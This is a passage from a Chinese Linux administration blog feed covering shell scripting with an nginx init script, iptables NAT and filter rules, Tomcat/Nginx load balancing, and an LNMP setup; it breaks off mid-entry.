        <content type="html"><![CDATA[<h2 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h2><h3 id="一、什么是脚本？"><a href="#一、什么是脚本？" class="headerlink" title="一、什么是脚本？"></a>一、什么是脚本？</h3><p>与.bat批处理文件是一种类型的文件。脚本编程语言一般是一种解释性的语言。脚本语言主要用于简化计算机相关人员对于一些反复性操作的重复执行，将这些反复性操作的代码写到一个文件中，每次只需要运行这个文件就可以减少很多的工作量。</p><h3 id="二、shell脚本编写格式"><a href="#二、shell脚本编写格式" class="headerlink" title="二、shell脚本编写格式"></a>二、shell脚本编写格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1：#!&#x2F;bin&#x2F;bash    #声明该脚本使用的命令解释器</span><br><span class="line">2：#filename:文件名    </span><br><span class="line">3：#脚本注释</span><br><span class="line">4：by athors ...</span><br></pre></td></tr></table></figure><h3 id="三、shell的变量赋值"><a href="#三、shell的变量赋值" class="headerlink" title="三、shell的变量赋值"></a>三、shell的变量赋值</h3><p>从标准输入接受变量复制：<code>read -p &quot;提示语句&quot; 变量名</code></p><h3 id="四、shell的if判断语句"><a href="#四、shell的if判断语句" class="headerlink" title="四、shell的if判断语句"></a>四、shell的if判断语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if condition1        #&#96;表达式&#96;可做condition，shell中0为真，非0为假</span><br><span class="line">then</span><br><span class="line">    command1</span><br><span class="line">elif condition2 </span><br><span class="line">then </span><br><span class="line">    command2</span><br><span class="line">else</span><br><span class="line">    commandN</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>大于：<code>-gt</code>、小于：<code>-lt</code>、等于：<code>-eq</code></p><h3 id="五、shell的for循环"><a href="#五、shell的for循环" class="headerlink" title="五、shell的for循环"></a>五、shell的for循环</h3><p>for循环根据<u>取值列表</u>循环。</p><p>生成取值列表：<code>&#123;1..100&#125;</code>    #生成1-100的取值列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for var in item1 item2 ... itemN(取值列表)</span><br><span class="line">do</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="六、shell的while循环"><a href="#六、shell的while循环" class="headerlink" title="六、shell的while循环"></a>六、shell的while循环</h3><p>while循环根据条件进行循环</p><p>echo字体颜色设置：<code>echo -e &quot;\e[1;33;41m 字符串 \e[0m&quot;</code></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. \e 转义起始符，定义一个转义序列， 可以使用 \033代替</span><br><span class="line">2. [ 表示开始定义颜色</span><br><span class="line">3. 1表示高亮，33表示字体颜色为黄色，45表示背景色为红色</span><br><span class="line">4. “test content” 属于文字内容</span><br><span class="line">5. m 转义终止符，表示颜色定义完毕</span><br><span class="line">6. 再次使用 \e[ ，表示再次开启颜色定义，0表示使用默认的颜色，m表示颜色定义结束，所以 \e[0m 的作用是恢复之前的配色方案</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字体颜色：30——37</span><br><span class="line"></span><br><span class="line">默认&#x3D;0，黑色&#x3D;30，红色&#x3D;31，绿色&#x3D;32，黄色&#x3D;33，蓝色&#x3D;34，紫色&#x3D;35，天蓝色&#x3D;36，白色&#x3D;3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字背景颜色：40——47</span><br><span class="line"></span><br><span class="line">默认&#x3D;0，黑色&#x3D;40，红色&#x3D;41，绿色&#x3D;42，黄色&#x3D;43，蓝色&#x3D;44，紫色&#x3D;45，天蓝色&#x3D;46，白色&#x3D;47</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while condition</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="七、shell的case语句"><a href="#七、shell的case语句" class="headerlink" title="七、shell的case语句"></a>七、shell的case语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">case 值 in</span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    command3</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    command3</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    command3</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><h3 id="八、shell函数"><a href="#八、shell函数" class="headerlink" title="八、shell函数"></a>八、shell函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[ function ] funname [()]</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    action;</span><br><span class="line"></span><br><span class="line">    [return int;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>1、可以带function fun() 定义，也可以直接fun() 定义,不带任何参数。</li><li>2、参数返回，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255）</li><li>3、函数返回值在调用该函数后通过 $? 来获得。</li></ul></blockquote><table><thead><tr><th align="left">参数处理</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">$#</td><td align="left">传递到脚本或函数的参数个数</td></tr><tr><td align="left">$*</td><td align="left">以一个单字符串显示所有向脚本传递的参数</td></tr><tr><td align="left">$$</td><td align="left">脚本运行的当前进程ID号</td></tr><tr><td align="left">$!</td><td align="left">后台运行的最后一个进程的ID号</td></tr><tr><td align="left">$@</td><td align="left">与$*相同，但是使用时加引号，并在引号中返回每个参数。</td></tr><tr><td align="left">$-</td><td align="left">显示Shell使用的当前选项，与set命令功能相同。</td></tr><tr><td align="left">$?</td><td align="left">显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table><blockquote><p>注意，$10 不能获取第十个参数，获取第十个参数需要${10}。当n&gt;=10时，需要使用${n}来获取参数。 </p></blockquote><h3 id="九、实验：编写一个nginx服务脚本，并交由chkconfig管理且实现开机自启动"><a href="#九、实验：编写一个nginx服务脚本，并交由chkconfig管理且实现开机自启动" class="headerlink" title="九、实验：编写一个nginx服务脚本，并交由chkconfig管理且实现开机自启动"></a>九、实验：编写一个nginx服务脚本，并交由chkconfig管理且实现开机自启动</h3><p>1、在/etc/rc.d/init.d下编写一个nginxd服务脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#filename: nginxd</span></span><br><span class="line"><span class="comment">#pwd: /etc/rc.d/init.d</span></span><br><span class="line"><span class="comment">#chkconfig: - 66 66        如果需要被chkconfig管理，必须加此注释</span></span><br><span class="line">nginx=/usr/<span class="built_in">local</span>/nginx/sbin/nginx</span><br><span class="line"><span class="function"><span class="title">start</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;nginx starting... [ \e[32mOK\e[0m ]&quot;</span></span><br><span class="line">    <span class="variable">$nginx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">stop</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;ngnix stoping... [ \e[32mOK\e[0m ]&quot;</span></span><br><span class="line">    <span class="variable">$nginx</span> -s stop</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">reload</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;ngnix stoping... [ \e[32mOK\e[0m ]&quot;</span></span><br><span class="line">    <span class="variable">$nginx</span> -s reload</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">status</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> `ss -ntpl | grep nginx &amp;&gt; /dev/null`</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;ngnix starting... [ \e[32mstarting\e[0m ]&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;ngnix is stoped... [ \e[31mstoped\e[0m ]&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line">    start</span><br><span class="line">    ;;</span><br><span class="line">stop)</span><br><span class="line">    stop</span><br><span class="line">    ;;</span><br><span class="line">status)</span><br><span class="line">    status</span><br><span class="line">    ;;</span><br><span class="line">reload)</span><br><span class="line">    reload</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage <span class="variable">$0</span> &#123;start|stop|reload|status&#125;&quot;</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>2、测试chkconfig是否可以管理此脚本：<code>chkconfig --list nginxd</code></p><p>3、将该脚本加入到chkconfig管理列表：<code>chkconfig --add nginxd</code></p><p>4、设置该脚本在level5级，也就是系统以图形化界面运行启动时，开启此脚本：<code>chkconfig --level 5 nginxd on</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11、iptables——NAT表</title>
      <link href="/2020/07/26/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/11%E3%80%81iptables%E2%80%94%E2%80%94NAT%E8%A1%A8/"/>
      <url>/2020/07/26/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/11%E3%80%81iptables%E2%80%94%E2%80%94NAT%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="iptables——NAT表"><a href="#iptables——NAT表" class="headerlink" title="iptables——NAT表"></a>iptables——NAT表</h2><h3 id="一、NAT表"><a href="#一、NAT表" class="headerlink" title="一、NAT表"></a>一、NAT表</h3><p>Network Address Translation：解决了Ipv4网络地址不够的问题，一个局域网或多个局域网公用一个公网地址的网络地址转换技术。</p><h3 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h3><blockquote><p>为了模拟互联网外网主机不写网关。</p></blockquote><p>SNAT环境：</p><p><a href="https://imgchr.com/i/apGXnK"><img src="https://s1.ax1x.com/2020/07/26/apGXnK.png" alt="apGXnK.png"></a></p><p>DNAT环境：</p><p><a href="https://imgchr.com/i/apdzrR"><img src="https://s1.ax1x.com/2020/07/26/apdzrR.png" alt="apdzrR.png"></a></p><h3 id="三、iptables——NAT表的规则编写"><a href="#三、iptables——NAT表的规则编写" class="headerlink" title="三、iptables——NAT表的规则编写"></a>三、iptables——NAT表的规则编写</h3><blockquote><p>路由后源地址转换、路由前目标地址转换</p></blockquote><h4 id="1、NAT表的三个链"><a href="#1、NAT表的三个链" class="headerlink" title="1、NAT表的三个链"></a>1、NAT表的三个链</h4><p>1）PREROUTING链：路由前位置的规则</p><p>2）POSTROUTING链：路由后位置的规则</p><p>3）OUTPUT链：出站位置规则</p><h4 id="2、SNAT源地址转换的规则编写"><a href="#2、SNAT源地址转换的规则编写" class="headerlink" title="2、SNAT源地址转换的规则编写"></a>2、SNAT源地址转换的规则编写</h4><p><u>1、POSTROUTING链配置SNAT：</u></p><p>1）手动配置转换的外网地址： <code>iptables -t nat -I/A（原表空的so都行） POSTROUTING -p tcp -o eth1（外网端口） -s 192.168.1.0/24（Ip或者网段都行） -j SNAT(源地址转换) --to-source 外网地址(也可以是一个范围) </code></p><p>2）动态获得转换的外网地址： <code>iptables -t nat -I/A（原表空的so都行） POSTROUTING -p tcp -o eth1（外网端口） -s 192.168.1.0/24（Ip或者网段都行） -j MASQUERADE （一律按照外网端口动态获得的IP地址转换）</code>    </p><p><u>2、需要注意Filter表中的FORWARD规则是否允许数据转发：</u></p><p>清除掉FORWARD的规则使其允许所有转发：<code>iptables -t filter -F FORWARD</code></p><h4 id="3、DNAT目标地址转换的规则编写"><a href="#3、DNAT目标地址转换的规则编写" class="headerlink" title="3、DNAT目标地址转换的规则编写"></a>3、DNAT目标地址转换的规则编写</h4><p><u>1、PREROUTING链配置DNAT：</u></p><p><code>iptables -t nat -A/-I PREROUTING -i ethX（外网端口）-d 外网映射地址 -p tcp（协议） --dport 外网映射端口 -j DNAT --to-destination 内网地址:端口</code></p><p><u>2、需要注意Filter表中的FORWARD规则是否允许数据转发：</u>因为目标地址转换完毕后，源地址和目标地址都和路由的主机无关，所以要检查Filter的FORWARD规则了。</p><p><a href="https://imgchr.com/i/aprstx"><img src="https://s1.ax1x.com/2020/07/26/aprstx.png" alt="aprstx.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10、iptables——Filter表</title>
      <link href="/2020/07/23/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/10%E3%80%81iptables%E2%80%94%E2%80%94Filter%E8%A1%A8/"/>
      <url>/2020/07/23/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/10%E3%80%81iptables%E2%80%94%E2%80%94Filter%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="包过滤防火墙（Centos6由iptables工具控制）"><a href="#包过滤防火墙（Centos6由iptables工具控制）" class="headerlink" title="包过滤防火墙（Centos6由iptables工具控制）"></a>包过滤防火墙（Centos6由iptables工具控制）</h2><h3 id="一、Linux防火墙的发展"><a href="#一、Linux防火墙的发展" class="headerlink" title="一、Linux防火墙的发展"></a>一、Linux防火墙的发展</h3><p>1、在初代Linux防火墙中，防火墙以ipfirewall的形式在内核中单独存在，防火墙规则也写在内核中。</p><p>2、二代Linux防火墙是ipchains(ip链)，二代可以创建和定义规则。</p><p>3、三代Linux防火墙机制就是iptables(ip表)，防火墙的主体在内核中，iptables是用户空间用于创建防火墙规则并与内核中的防火墙进行通信的实体。</p><h3 id="二、iptables的四个功能（表）"><a href="#二、iptables的四个功能（表）" class="headerlink" title="二、iptables的四个功能（表）"></a>二、iptables的四个功能（表）</h3><p>1、raw表与mangle表（很少配置）：数据流量的跟踪与整形。</p><p>2、NAT表(Network Address Translation)</p><p>3、Filter表(过滤表):通过对Filter表中规则编写，限制某些IP地址访问主机的某些服务、过滤主机IP数据包的转发、协议的过滤等。</p><p><a href="https://imgchr.com/i/aprstx"><img src="https://s1.ax1x.com/2020/07/26/aprstx.png" alt="aprstx.png"></a></p><h3 id="三、iptables的基本命令"><a href="#三、iptables的基本命令" class="headerlink" title="三、iptables的基本命令"></a>三、iptables的基本命令</h3><p>查看Filter表的信息：<code>iptables -t filter -nvL</code></p><p>每隔1秒刷新显示一次Filter表信息：<code>watch -n 1（秒数） -d(高亮) iptables -t filter -nvL</code></p><p>重启iptables服务：<code>service iptables restart</code></p><blockquote><p>重启iptables服务后，所有表的规则会按照默认的配置重置。</p></blockquote><h3 id="四、iptables规则的编写"><a href="#四、iptables规则的编写" class="headerlink" title="四、iptables规则的编写"></a>四、iptables规则的编写</h3><blockquote><p>iptables 四表五链：四个功能表、五个配置位置的链； </p><p><a href="https://imgchr.com/i/UztAwF"><img src="https://s1.ax1x.com/2020/07/25/UztAwF.png" alt="UztAwF.png"></a></p><p><strong>控制类型：</strong>ACCEPT允许、DROP直接丢弃、REJECT拒绝必要时有提示、LOG记录日志信息不处理</p><p><strong>选项</strong>：</p><blockquote><p><strong>添加选项</strong>：-A 在链的末尾追加一条规则、-I 在链头插入规则、 -I 链名 n 指定序号n插入</p><p><strong>查看选项</strong>：-L 列出所有的规则条目、 -n 以数字的形式显示地址、端口等信息、 -v 详细显示、 -line-numbers 显示规则的序号</p><p><strong>删除选项</strong>：-D 链名 n， 删除链内指定序号n的规则； -F 清空所有规则(iptables -F或者iptables -t XXX -F)</p><p><strong>默认策略选项</strong>：-P 链名 ACCEPT/DROP，修改某链中没规则匹配时默认执行的操作(缺省是ACCEPT)。</p></blockquote><p><strong>条件：</strong></p><blockquote><p><strong>通用匹配：</strong>通用匹配是条件<u>必须</u>要有的</p><p>协议匹配：-p 协议名</p><p>地址匹配：-s 源地址、-d 目标地址</p><p>接口匹配：-i 入站网卡、-o 出站网卡</p><p><strong>隐含匹配：</strong>隐含匹配非必须条件，用于配合通用匹配</p><p>端口匹配：–sport 源端口、–dport 目的端口</p><p>TCP标记匹配：–tcp-flags 检查TCP报文中被设置的标记(ACK、SYN…)</p><p>ICMP类型匹配：–icmp-type ICMP类型(0、3、8)</p><p><strong>显示匹配：</strong></p><p>多端口匹配：-m multiport –sports | –dports 多端口列表(23,80,443…)</p><p>IP范围匹配：-m iprange –src-range IP范围</p><p>MAC地址匹配：-m mac –mac-source MAC地址</p><p>状态匹配：-m state –state 连接状态(ESTABLISHED…)</p></blockquote></blockquote><h4 id="1、Filter表规则的编写（Filter三个链）："><a href="#1、Filter表规则的编写（Filter三个链）：" class="headerlink" title="1、Filter表规则的编写（Filter三个链）："></a><strong>1、Filter表规则的编写（Filter三个链）：</strong></h4><p><u>1）INPUT链(入站链)：</u></p><blockquote><p><code>iptables -t filter -I（插入写到链头） INPUT -p tcp --dport 80 -j ACCEPT</code>        #允许访问本机80服务</p><p><a href="https://imgchr.com/i/UzUyzn"><img src="https://s1.ax1x.com/2020/07/25/UzUyzn.png" alt="UzUyzn.png"></a></p></blockquote><p><u>2）FORWARD链（转发规则链）：当源地址和目标地址都不是本机IP地址时，遵循该链规则。</u></p><blockquote><p><code>iptables -I FORWARD -s 0.0.0.0/0 -d 0.0.0.0/0 -j DROP</code>        #丢弃所有数据包转发（默认filter表、默认所有协议、默认in out所有接口）</p><p><a href="https://imgchr.com/i/UzNKhj"><img src="https://s1.ax1x.com/2020/07/25/UzNKhj.png" alt="UzNKhj.png"></a></p></blockquote><p><u>3）OUTPUT链(出站链)：</u></p><h3 id="五、防火墙规则的保存"><a href="#五、防火墙规则的保存" class="headerlink" title="五、防火墙规则的保存"></a>五、防火墙规则的保存</h3><p>将当前防火墙的规则配置信息保存到文件中：<code>iptables-save &gt; 目录/文件名</code></p><p>将配置信息导入到防火墙中：<code>iptables-restore &lt; 目录/文件名</code></p><p>将当前防火墙的规则信息存储到根防火墙配置中：<code>service iptables save</code></p><blockquote><p>即修改了iptables的最根本的配置文件/etc/sysconfig/iptables，此后每次重启iptables服务，都会来这个配置文件里面拿规则。</p></blockquote><h3 id="六、实验"><a href="#六、实验" class="headerlink" title="六、实验"></a>六、实验</h3><blockquote><p>环境：Centos6.9 Ftp服务器192.168.1.254； WindowsXP客户机192.168.1.1</p></blockquote><p>1、Centos6.9安装FTP服务器：<code>yum install -y vsftpd</code></p><p>2、开启FTP服务：<code>service vsftpd start</code></p><p>3、设置防火墙规则：<code>iptables -t filter -I INPUT -p tcp --dport 21 -j ACCEPT</code></p><p>4、客户机cmd尝试连接发现成功：<code>ftp 192.168.1.254</code>，用户名:<code>ftp</code>，密码空。ftp用户的家目录/共享目录是/var/ftp</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9、Tomcat服务器搭建与Nginx负载均衡</title>
      <link href="/2020/07/22/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/9%E3%80%81Tomcat%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8ENginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
      <url>/2020/07/22/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/9%E3%80%81Tomcat%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8ENginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="Tomcat服务器搭建与Nginx负载均衡"><a href="#Tomcat服务器搭建与Nginx负载均衡" class="headerlink" title="Tomcat服务器搭建与Nginx负载均衡"></a>Tomcat服务器搭建与Nginx负载均衡</h2><h3 id="一、Tomcat的使用场景"><a href="#一、Tomcat的使用场景" class="headerlink" title="一、Tomcat的使用场景"></a>一、Tomcat的使用场景</h3><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，因此主要用于运行JSP 页面和Servlet，功能没有Apache和Nginx功能全面，性能也不及它俩。</p><h3 id="二、部署Tomcat-Web服务器与Tomcat特点"><a href="#二、部署Tomcat-Web服务器与Tomcat特点" class="headerlink" title="二、部署Tomcat Web服务器与Tomcat特点"></a>二、部署Tomcat Web服务器与Tomcat特点</h3><blockquote><p>实验用例是Tomcat免安装版，Tomcat依赖JDK环境，因此如果没有JDK需要安装。</p></blockquote><p>1、解压Tomcat免安装版的压缩包</p><p>2、分析一下网页资源的目录在Webapps</p><blockquote><p>Webapps/ROOT        #默认主页所在的目录</p></blockquote><p>3、开启Tomcat服务 <code>bin/startup.sh</code>，Tomcat的默认端口是8080</p><h3 id="三、Tomcat-Nginx实现负载均衡"><a href="#三、Tomcat-Nginx实现负载均衡" class="headerlink" title="三、Tomcat+Nginx实现负载均衡"></a>三、Tomcat+Nginx实现负载均衡</h3><p><strong>权重</strong>：负载均衡机制通过服务器权重的设置来分配服务器的资源使用。</p><blockquote><p>实验环境：一台Centos6虚拟机部署1个Nginx、2个tomcat服务器</p></blockquote><p><strong>1、将三个服务器在一个机器中部署：</strong></p><p>​    要想在1台虚拟机部署三个Web服务器首先要考虑的就是端口占用问题，Nginx默认80、Tomcat默认8080，因此只需要将其中一个Tomcat端口改为8081即可。</p><p>​    Tomcat服务器配置端口比传统服务器复杂，通过PREFIX/conf/server.xml中对各个标签头port的修改即可。也许不需要 -&gt;（并且需要在第二个tomcat服务器的start.sh和stop.sh中加入<code>export CATALINA_HOME=第二个Tomcat的PREFIX目录路径</code>、<code>export CATALINA_BASE=第二个Tomcat的PREFIX目录路径</code>即可）。</p><p><strong>2、Nginx配置文件中配置负载均衡</strong></p><p>在http{}中加入负载均衡集群配置：</p><blockquote><p>upstream 负载均衡配置块名(tomcat_server) {</p><p>​    server 服务器IP:端口 weight=权值;    #配置负载均衡集群中的服务器地址并赋予权重</p><p>​    server 服务器IP:端口 weight=权值;    #同上</p><p>}</p></blockquote><p>在location / {}中加入代理配置：</p><blockquote><p>proxy_pass http://负载均衡配置块名；    #每当访问nginx的/下的网页都会触发该代理</p></blockquote><h3 id="四、正向代理服务器和反向代理服务器"><a href="#四、正向代理服务器和反向代理服务器" class="headerlink" title="四、正向代理服务器和反向代理服务器"></a>四、正向代理服务器和反向代理服务器</h3><p>1、反向代理服务器：类似于Nginx负载均衡，用户在向服务器请求服务时，对于用户来说不清楚真正为其服务的是哪个服务器，则用户所请求的服务器类型就称为反向代理服务器。（用户已知，服务器未知）</p><p>2、正向代理服务器：用户通过VPN等代理服务器去请求某个服务器，用户请求哪个，为其服务的就是哪个服务器，这种情况为其服务的服务器称为正向代理服务器。（用户是未知，服务器已知）</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8、LNMP架构搭建(Nginx)</title>
      <link href="/2020/07/22/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/8%E3%80%81LNMP%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA%EF%BC%88Nginx%EF%BC%89/"/>
      <url>/2020/07/22/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/8%E3%80%81LNMP%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA%EF%BC%88Nginx%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="LNMP架构搭建（Nginx）"><a href="#LNMP架构搭建（Nginx）" class="headerlink" title="LNMP架构搭建（Nginx）"></a>LNMP架构搭建（Nginx）</h2><h3 id="一、Nginx的优点"><a href="#一、Nginx的优点" class="headerlink" title="一、Nginx的优点"></a>一、Nginx的优点</h3><p>1、处理高并发性更好</p><p>2、系统资源利用率比较高，损耗率很低，稳定(C语言开发)</p><p>3、Nginx是异步IO模型，一个进程对应多个连接；Apache是同步IO模型，一个进程对应一个连接。</p><p>4、处理静态网页的能力更好</p><h3 id="二、Nginx环境的搭建"><a href="#二、Nginx环境的搭建" class="headerlink" title="二、Nginx环境的搭建"></a>二、Nginx环境的搭建</h3><p><u>1、安装Nginx环境，首先需要安装Nginx的运行库/开发环境软件包。</u></p><p><strong>开发环境软件包什么样：</strong>后缀带”-devel”的软件包。</p><p><strong>安装Nginx的开发环境/运行库</strong>：<code>yum install pcre-devel</code>、<code>yum install zlib-devel</code>(在安装系统时选中了开发环境，因此该软件包已安装完毕)</p><p><u>2、源码包的方式安装Nginx服务器</u>：</p><p><strong>源码包老套路，检查编译环境并指定安装路径、程序用户和组，各子目录生成Makefile文件：</strong><code> ./configure --prefix=/usr/local/nginx --with-file-aio（） --with-http_gzip_static_module --with-http_flv_module --with-http_ssl_module --user=nginx --group=nginx --with-http_stub_status_module</code></p><p><strong>编译和安装</strong>：<code>make</code>、<code>make install</code></p><p><u>3、创建Nginx的进程/程序用户，使Nginx程序单独由该用户管理，以保证Nginx服务的安全性</u>：<code>useradd -M -s /sbin/nologin nginx</code>(不要家目录，不可登录)</p><p>4、<u>nginx的prefix工作目录下开启nginx服务</u>：<code>./nginx</code></p><blockquote><p><code>./nginx -?</code>    #查看nginx帮助</p><p><code>./nginx -s </code>    #给nginx进程发信号 stop 停止服务</p></blockquote><h3 id="三、Nginx服务器配置文件介绍"><a href="#三、Nginx服务器配置文件介绍" class="headerlink" title="三、Nginx服务器配置文件介绍"></a>三、Nginx服务器配置文件介绍</h3><blockquote><p>Nginx主配置文件：PREFIX/conf/nginx.conf</p><p>1-10行全局配置、11-14行I/O事件配置、17行以后全是http配置</p></blockquote><p>第3行左右： <code>worker_processes 1;</code>        #Nginx服务使用的CPU核心数</p><p>第13行左右：<code>worker_connections 1024;</code>        #每个进程处理的最大连接数</p><p>35行左右：<code>listen 80</code>        #监听端口<br>36行左右：<code>server_name localhost</code>        #服务IP地址</p><p>43行左右：<code>location / &#123; root html; index index.html index.htm;&#125;</code>    #定义Nginx网页根目录和网页主页索引值</p><h3 id="四、源码包安装PHP并使Nginx可以解析PHP"><a href="#四、源码包安装PHP并使Nginx可以解析PHP" class="headerlink" 